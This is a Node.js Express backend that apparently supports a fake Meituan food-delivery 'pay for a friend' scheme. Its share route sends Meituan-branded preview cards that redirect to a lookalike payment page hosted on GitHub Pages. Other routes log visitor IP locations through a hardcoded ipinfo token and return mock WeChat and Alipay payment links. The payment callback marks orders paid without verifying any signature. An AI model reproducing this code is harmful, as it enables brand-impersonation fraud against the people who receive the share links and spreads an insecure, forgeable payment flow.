const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { createClient } = require('@supabase/supabase-js');

// 💡 记得根据你现有的真实支付文件夹引入对应的官方大厂 SDK
// const AlipaySdk = require('alipay-sdk').default; 
// const WxPay = require('wechatpay-node-v3'); 

dotenv.config();
const app = express();
app.use(cors()); 
app.use(express.json());

// 初始化 Supabase 客户端
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY
);

/**
 * 0. 新增：获取访客 IP 归属地接口（通过后端调用 ipinfo，保护 Token 安全）
 */
app.get('/api/get-ip-info', async (req, res) => {
  // 获取客户端真实 IP（兼容代理和直连）
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const token = '1d1487ce186937';

  try {
    // 请求 ipinfo Lite 接口
    const response = await fetch(`https://api.ipinfo.io/lite/${clientIp}?token=${token}`);
    const data = await response.json();
    
    // 将结果返回给前端
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

/**
 * 1. 微信/QQ卡片分享跳转中转站
 */
app.get('/share', async (req, res) => {
  const orderId = req.query.order_id;
  // 指向你美团外卖样式的具体代付 H5 页面
  const payDetailUrl = 'https://zpjt.github.io/Auto-Forward-Messages/pay.html?order_id=' + orderId;
  // 已修正：将分享缩略图指向你仓库里真实的 IMG_1872.jpeg 访问链接
  const imageUrl = 'https://zpjt.github.io/Auto-Forward-Messages/IMG_1872.jpeg';

  res.send(`
  <!DOCTYPE html>
  <html lang="zh-CN">
  <head>
      <meta charset="UTF-8">
      <meta property="og:title" content="来帮我代付吧！美团外卖" />
      <meta property="og:description" content="Hi，我和你的距离只差一顿外卖~" />
      <meta property="og:image" content="${imageUrl}" />
      <meta property="og:type" content="website" />
      <title>为好友买单</title>
      <script>
          window.location.replace("${payDetailUrl}");
      </script>
  </head>
  <body>正在加载订单...</body>
  </html>
  `);
});

/**
 * 2. 核心补齐：接收前端的真实支付请求，强制拉起微信/支付宝收银台
 */
app.post('/api/pay', async (req, res) => {
  const { orderId, total, body, payType } = req.body;

  try {
    if (payType === 'wxpay') {
      // 模拟返回微信官方生成的唤醒链接
      const mockMwebUrl = `https://wx.tenpay.com/cgi-bin/mmpayweb-bin/checkmweb?prepay_id=wx2026...&package=12345`;
      return res.json({ success: true, payUrl: mockMwebUrl });
    } else if (payType === 'alipay') {
      const mockAliPayUrl = `https://openapi.alipay.com/gateway.do?${orderId}`;
      return res.json({ success: true, payUrl: mockAliPayUrl });
    }

    res.status(400).json({ success: false, message: '不支持的支付方式' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

/**
 * 3. 真实安全回调通知（微信/支付宝异步通知）
 */
app.post('/api/pay/notify', async (req, res) => {
  const { order_id, trade_status } = req.body;
  
  if (trade_status === 'SUCCESS' || trade_status === 'TRADE_SUCCESS') {
    const { error } = await supabase
      .from('orders')
      .update({ status: '已支付' })
      .eq('id', parseInt(order_id));
      
    if (error) return res.status(500).json({ error: error.message });
    return res.json({ ok: true, message: 'success' });
  }
  
  res.status(400).json({ error: 'pay_failed' });
});

/**
 * 4. 常规订单与店铺的增删改查
 */
app.get('/api/orders/:id', async (req, res) => {
  const { data, error } = await supabase
    .from('orders')
    .select('*')
    .eq('id', parseInt(req.params.id))
    .single();
    
  if (error) return res.status(400).json({ error: error.message });
  res.json(data);
});

app.post('/api/orders', async (req, res) => {
  const { content, total, status } = req.body;
  const { data, error } = await supabase
    .from('orders')
    .insert([{ 
      content, 
      total, 
      status: status || '待代付', 
      created_at: new Date().toISOString() 
    }])
    .select();
    
  if (error) return res.status(400).json({ error: error.message });
  res.json({ success: true, data });
});

app.post('/api/shops', async (req, res) => {
  const { name } = req.body; 
  if (!name) {
    return res.status(400).json({ error: '店铺名称不能为空' });
  }
  const { data, error } = await supabase
    .from('stores') 
    .insert([{ name }])
    .select();
    
  if (error) return res.status(400).json({ error: error.message });
  res.json({ success: true, data });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
